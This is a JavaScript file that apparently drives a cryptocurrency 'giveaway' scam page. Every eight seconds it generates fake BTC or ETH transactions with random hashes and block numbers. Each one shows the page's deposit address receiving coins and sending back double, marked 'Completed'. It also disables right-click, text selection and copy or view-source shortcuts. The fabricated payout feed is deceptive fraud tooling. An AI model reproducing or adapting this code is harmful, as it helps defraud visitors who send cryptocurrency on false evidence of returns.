function round(e, n) {
    return Number(Math.round(e + "e" + n) + "e-" + n)
}

function copy(e) {
    var n = document.createElement("textarea");
    n.innerHTML = e, document.body.appendChild(n), n.select(), document.execCommand("copy"), document.body.removeChild(n)
}

function kill_ctrl_key_combo(e) {
    var n, t, o = new Array("a", "c", "x", "s", "u");
    if (window.event ? (n = window.event.keyCode, t = !!window.event.ctrlKey) : (n = e.which, t = !!e.ctrlKey), t) for (i = 0; i < o.length; i++) if (o[i].toLowerCase() == String.fromCharCode(n).toLowerCase()) return !1;
    return !0
}

function disable_selection(e) {
    void 0 !== e.style.MozUserSelect && (e.style.MozUserSelect = "none"), e.style.cursor = "default"
}

function double_mouse(e) {
    return 2 != e.which && 3 != e.which
}

function enable_protection() {
    disable_selection(document.body), document.captureEvents(Event.MOUSEDOWN), document.onmousedown = double_mouse, document.oncontextmenu = function () {
        return !1
    }, document.onkeydown = kill_ctrl_key_combo
}

$(document).ready((function () {
    function e(e, n) {
        n = n || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        for (var t = "", o = 0; o < e; o++) {
            var r = Math.floor(Math.random() * n.length);
            t += n.substring(r, r + 1)
        }
        return t
    }

    function n(e, n) {
        let t = e + Math.random() * (n + 1 - e);
        return Math.floor(t)
    }

    function t() {
        let t = 1 == n(0, 1) ? "BTC" : "ETH",
            o = "BTC" == t ? n(0, 5) + "." + e(5, "123456789") : n(0, 20) + "." + e(5, "123456789"), r = 2 * ++o,
            c = o / 1e5, i = "BTC" == t ? $("input[name=address_btc]").val() : $("input[name=address_eth]").val(),
            a = `<div class="transaction-item">\n                <p class="txhash">${e(25) + "..."}</p>\n                <p class="block">${e(6, "123456789")}</p>\n                <p class="from">${e(25) + "..."}<br>${i}</p>\n                <div class="arrow"><img src="images/check.svg" alt=""></div>\n                <p class="to">${i}<br>${e(25) + "..."}</p>\n                <p class="value">${round(r, 7)} ${t}<br>${round(o, 7)} ${t}</p>\n                <p class="fee">${round(c, 5)}</p>\n                <p class="status">Completed</p>\n            </div>`;
        $(a).hide().prependTo(".transaction-content").fadeIn("slow"), $(".transaction-item:eq(5)").remove()
    }

    document.oncontextmenu = function () {
        return !1
    }, t(), t(), t(), t(), t(), setInterval(t, 8e3), $('a[href^="#"]').click((function () {
        var e = $(this).attr("href");
        return $("html, body").animate({scrollTop: $(e).offset().top - 50}, 500), !1
    })), $(".participate-button").click((function () {
        $(this).parents(".participate-item").find(".address-done").fadeIn(200), setTimeout((() => $(this).parents(".participate-item").find(".address-done").fadeOut(200)), 1e3)
    }))
})), jQuery.fn.ForceNumericOnly = function () {
    return this.each((function () {
        $(this).keydown((function (e) {
            var n = e.charCode || e.keyCode || 0;
            return 8 == n || 46 == n || 190 == n || n >= 35 && n <= 40 || n >= 48 && n <= 57 || n >= 96 && n <= 105
        }))
    }))
};